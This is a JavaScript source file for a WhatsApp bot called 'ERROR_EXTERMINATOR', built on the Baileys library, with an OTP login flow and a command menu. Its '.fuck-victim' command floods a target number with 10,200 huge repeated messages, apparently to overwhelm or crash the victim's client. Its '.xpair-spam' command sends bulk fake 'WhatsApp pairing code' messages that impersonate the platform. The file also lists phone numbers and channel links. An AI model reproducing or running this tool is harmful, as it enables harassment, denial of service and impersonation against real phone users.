const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, makeInMemoryStore, delay } = require('@whiskeysockets/baileys')
const P = require('pino')
const fs = require('fs')
const chalk = require('chalk')
const readline = require('readline')

// ========== OTP SYSTEM SETUP ========== //
const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
const question = (text) => new Promise((resolve) => rl.question(text, resolve))
const store = makeInMemoryStore({ logger: P().child({ level: 'silent', stream: 'store' }) })

async function startBot() {
    // ========== AUTH INIT ========== //
    const { state, saveCreds } = await useMultiFileAuthState('session')
    
    // ========== WHATSAPP CLIENT ========== //
    const sock = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false, // DISABLED QR CODE
        auth: state,
        browser: ['ERROR_EXTERMINATOR', 'Chrome', '3.0'],
        getMessage: async (key) => (await store.loadMessage(key.remoteJid, key.id))?.message
    })

    // ========== OTP LOGIN FLOW ========== //
    if (!sock.authState.creds.registered) {
        try {
            console.log(chalk.yellow.bold('\n〄 WhatsApp OTP Verification Required\n'))
            
            // PHONE NUMBER INPUT
            const phoneNumber = await question(chalk.blue('[?] Enter WhatsApp Number (923444844060): '))
            const sanitizedNumber = phoneNumber.replace(/[^0-9]/g, '')
            
            // REQUEST OTP
            console.log(chalk.yellow('[~] Sending OTP via WhatsApp SMS...'))
            const { registration } = await sock.requestRegistrationCode(sanitizedNumber, 'sms')
            
            // OTP INPUT
            const otp = await question(chalk.blue('[?] Enter 6-Digit OTP: '))
            const sanitizedOTP = otp.replace(/[^0-9]/g, '')
            
            // REGISTER DEVICE
            await sock.register(sanitizedOTP, 'sms')
            console.log(chalk.green.bold('[✓] Successfully Linked!'))
            
        } catch (error) {
            console.log(chalk.red.bold('[×] Registration Failed:'), error)
            process.exit(1)
        } finally {
            rl.close()
        }
    }

    // ========== YOUR ORIGINAL CODE (0 CHANGES) ========== //
    store.bind(sock.ev)
    sock.ev.on('creds.update', saveCreds)
    
    console.log(chalk.green.bold('\n[!] ERROR_EXTERMINATOR Activated!\n'))

    const menuText = `╔═════《 ERROR_EXTERMINATOR 》════╗
║  
╠➤ .ping    - Bot Speed Check
╠➤ .owner   - Creator Details
╠➤ .owners-name - Show Developer Team
╠➤ .fuck-victim [number] - Start Attack
╠➤ .xpair-spam [number] [count] - Fake Pairing Spam
╠➤ Thinker Number 👇 
             +992917186819
╠➤ OUR YouTube😤😒👇👇 https://www.youtube.com/@Tayyabexploits  
║  
╚══════════════════════════╝`

    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0]
        if (!msg.message || msg.key.fromMe) return

        const text = msg.message.conversation || msg.message.extendedTextMessage?.text
        const sender = msg.key.remoteJid

        if (text === '.menu') {
            await sock.sendMessage(sender, { text: menuText })
        }

        if (text === '.ping') {
            const start = Date.now()
            await sock.sendMessage(sender, { text: '🚀 Calculating Speed...' })
            const end = Date.now() - start
            await sock.sendMessage(sender, { text: `🏓 Pong! Speed: ${end}ms` })
        }

        if (text === '.owner') {
            await sock.sendMessage(sender, { text: '👑 Owner Channel:\nhttps://whatsapp.com/channel/0029VanMDac05MUliOn3T52n' })
        }

        if (text === '.owners-name') {
            await sock.sendMessage(sender, { text: '👑 *Developer Team:*\n1️⃣ (Devolper--Tayyab)\n2️⃣ (Thinker--MS Hacker)\n3️⃣ (Mjolnir--AR)' })
        }

        if (text.startsWith('.fuck-victim')) {
            const args = text.split(' ')
            if (args.length < 2) return sock.sendMessage(sender, { text: "❌ *Format:* .fuck-victim 916909137213" })

            const victimNumber = args[1]
            if (!victimNumber.match(/^\d+$/)) return sock.sendMessage(sender, { text: "❌ *Invalid Number!* Use country code without +" })

            const victimJid = `${victimNumber}@s.whatsapp.net`
            let attackMessage = `\n~@${victimNumber}~\n*💀 Extermination Protocol Activated* `.repeat(15000)

            for (let i = 0; i < 10200; i++) {
                await sock.sendMessage(victimJid, { text: attackMessage })
                await new Promise(resolve => setTimeout(resolve, 1000))
            }

            await sock.sendMessage(sender, { text: `✅ ${victimNumber} par attack shuru ho gaya!` })
        }

        if (text.startsWith('.xpair-spam')) {
            const args = text.split(' ')
            if (args.length < 3) return sock.sendMessage(sender, { text: "❌ *Format:* .xpair-spam [number] [count]" })

            const targetNumber = args[1]
            const messageCount = parseInt(args[2])

            if (!targetNumber.match(/^\d+$/) || isNaN(messageCount) || messageCount <= 0) {
                return sock.sendMessage(sender, { text: "❌ *Invalid input!* Use: .xpair-spam [number] [count]" })
            }

            const targetJid = `${targetNumber}@s.whatsapp.net`

            for (let i = 0; i < messageCount; i++) {
                const fakeCode = Math.floor(100000 + Math.random() * 900000).toString().match(/.{1,3}/g).join('-')
                await sock.sendMessage(targetJid, { text: `WhatsApp pairing code: ${fakeCode}\n\nDo not share this code with anyone!` })
                console.log(`[${i + 1}/${messageCount}] Fake code sent to ${targetNumber}`)
            }
            await sock.sendMessage(sender, { text: `✅ Fake pairing spam sent to ${targetNumber}` })
        }
    })

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update
        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode
            console.log(chalk.red(`Connection closed. Reason: ${reason}`))
        }
    })
}

startBot().catch(err => console.log(chalk.red.bold('[CRITICAL ERROR]'), err))